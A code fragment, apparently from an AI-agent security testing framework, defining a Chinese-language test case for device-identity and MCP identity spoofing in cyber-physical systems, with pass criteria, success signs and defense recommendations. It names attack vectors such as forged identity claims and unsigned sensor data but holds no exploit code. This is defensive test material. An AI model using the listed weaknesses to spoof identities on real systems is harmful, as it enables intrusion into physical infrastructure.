                        '通过标准: AI Agent 应拒绝所有来源不可验证的传感器数据\n' +
                        '修复: 传感器数据实施端到端签名 + 时间戳 + 序列号防重放',
                },
            ],
        },
        validation: {
            indicators: [
                '设备证书存在完整信任链（设备→中间CA→根CA）',
                '设备私钥存储在 TPM/Secure Element 中',
                '覆盖网络节点间启用了双向证书验证',
                '传感器数据包经过来源签名和时间戳标记',
                'MCP 身份声明经过可信组件注册表验证',
                '设备证书撤销后立即被信任系统拒绝',
            ],
            successSigns: [
                '发现使用默认证书或硬编码凭证的 CPS 设备',
                '伪造的 MCP 身份声明被服务端拒绝',
                '传感器数据链路缺乏来源签名被识别',
                '设备证书轮换机制缺失或手动流程',
                '覆盖网络节点间未启用双向认证',
            ],
            falsePositiveSigns: [
                '设备使用自签名证书但内部 CA 在离线环境中可接受',
                '传感器数据未签名但通过物理隔离网络传输',
                'MCP 身份声明验证失败是由配置问题而非安全缺陷',
            ],
        },
        defense: {
            recommendations: [
                '部署 SMCP 可信组件注册表管理 CPS 设备身份',
                '设备私钥强制存储在 TPM 或 Secure Element 中',
                '传感器数据实施端到端数字签名',
                '覆盖网络（WireGuard/IPSec）启用双向证书认证',
                '建立设备证书自动轮换和撤销机制',
                'MCP 通信中验证身份声明的签名链',
                '设备删除时即时从信任注册表中移除',
            ],
            mitigations: [
                '使用 TPM 2.0 或类似的硬件安全模块保护设备身份',
                '定期审计设备证书状态和轮换日志',
                '部署证书透明度(CT)日志用于监控异常证书',
                '建立 CPS 设备身份与物理位置的双向绑定',
            ],
            references: [
                'Securing AI Agents in CPS (Hatami et al., arXiv:2601.20184, 2026)',
                'SMCP: Secure Model Context Protocol (arXiv:2602.011, 2026)',
                'NIST SP 800-183: Networks of Things',
                'TPM 2.0 规范: https://trustedcomputinggroup.org/',
                'AWS IoT Core 设备身份: https://docs.aws.amazon.com/iot/',
            ],
        },
        quality: {
            confidence: 0.86,
            reviewed: false,
            tested: false,
            lastVerified: '2026-06',
        },
        playbooks: ['cloud-config-audit'],
        phase: 'permission-testing',
        enabled: true,
        runtime: {
            requiresAgent: false,
            agentCount: 1,
            parallelizable: true,
            requiresNetwork: true,
            requiresSandbox: false,
            dependencies: ['cps-ai-security-001'],
            estimatedTokens: 3000,
        },
    },
];
